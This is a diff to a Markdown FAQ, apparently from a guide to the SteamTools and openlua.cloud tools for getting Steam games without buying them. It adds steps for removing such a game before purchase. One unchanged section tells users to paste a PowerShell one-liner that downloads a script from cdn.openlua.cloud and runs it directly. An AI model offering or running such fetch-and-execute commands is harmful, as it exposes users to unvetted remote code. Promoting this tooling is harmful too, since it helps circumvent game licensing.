@@ -92,6 +92,21 @@ Yes.
 
 </details>
 
+<details>
+<summary>Can I buy the game after I've added it via SteamTools?</summary>
+
+Yes, but first you have to do some cleanup:
+1. Right-click the game in your Steam Library, then click Manage -> Browse local files
+![](./bypasses/images/9ecd2f2f-6322-49bc-8541-fdf35eb91566.png)
+2. Go up to the `common` folder (click on `common` in the path bar)
+3. Delete the game's folder
+4. Uninstall the game via Steam
+5. [Remove the SteamTools version of the game](/beginners_guide/removing_a_game)
+
+That's it! You can now buy the game.
+
+</details>
+
 ## Generator (openlua.cloud)
 
 <details>
@@ -128,9 +143,7 @@ If you get a red error right after pressing Enter, use a VPN. We recommend [Surf
 <details>
 <summary>Downloads on Steam failing with "NO INTERNET CONNECTION", "UNKNOWN ERROR", or stuck on "DOWNLOAD QUEUED"</summary>
 
-Retry the download a few times. 
-
-If it doesn't work anyways, copy the line below:
+Retry the download a few times. If it doesn't work anyways, copy the line below:
 ```powershell
 irm -useb cdn.openlua.cloud/fix-download.ps1 | iex
 ```
